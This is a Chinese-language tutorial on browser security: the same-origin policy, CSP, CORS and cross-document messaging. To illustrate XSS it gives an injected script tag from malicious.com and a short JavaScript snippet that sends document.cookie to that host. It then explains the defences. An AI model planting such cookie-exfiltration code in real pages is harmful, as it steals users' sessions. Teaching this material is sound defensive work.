# 页面安全策略

- 同源策略
- 跨域资源共享策略
- 跨文档消息机制

## 同源策略（Same-origin policy）

同源策略可以隔离各个站点之间的 DOM 交互、页面数据和网络通信，虽然严格的同源策略会带来更多的安全，但是也束缚了 Web。这就需要在安全和自由之间找到一个平衡点，所以我们默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。

不过支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击。

### 什么是同源策略

**如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。**

浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。

同源策略主要表现在 DOM、Web 数据和网络这三个层面。

### 1. DOM层面

同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。

### 2. 数据层面

同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。

### 3. 网络层面

同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。

## 同源策略产生什么问题

1. 页面中可以嵌入第三方资源
2. 跨域资源共享
3. 跨文档消息机制

### 1. 页面中可以嵌入第三方资源

同源策略要求一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，因此来了诸多限制。

比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。

不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。

```html
<head>
  <script src="http://malicious.com/malicious.js">
</head>
```

比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码，当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。

除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。

```js
function onClick(){
  let url = `http://malicious.com?cookie = ${document.cookie}`
  open(url)
}
onClick()
```

在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。

以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了**内容安全策略**，称为 CSP。**CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。**通过这些手段就可以大大减少 XSS 攻击。

### 2. 跨域资源共享

默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。

为了解决这个问题，我们引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。

### 3. 跨文档消息机制

在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。

---

- 页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。
- 使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。
- 两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。

---

页面安全问题的主要原因就是浏览器为同源策略开的两个“后门”：一个是在页面中可以任意引用第三方资源，另外一个是通过 CORS 策略让 XMLHttpRequest 和 Fetch 去跨域请求资源。

为了解决这些问题，我们引入了 CSP 来限制页面任意引入外部资源，引入了 HttpOnly 机制来禁止 XMLHttpRequest 或者 Fetch 发送一些关键 Cookie，引入了 SameSite 和 Origin 来防止 CSRF 攻击。
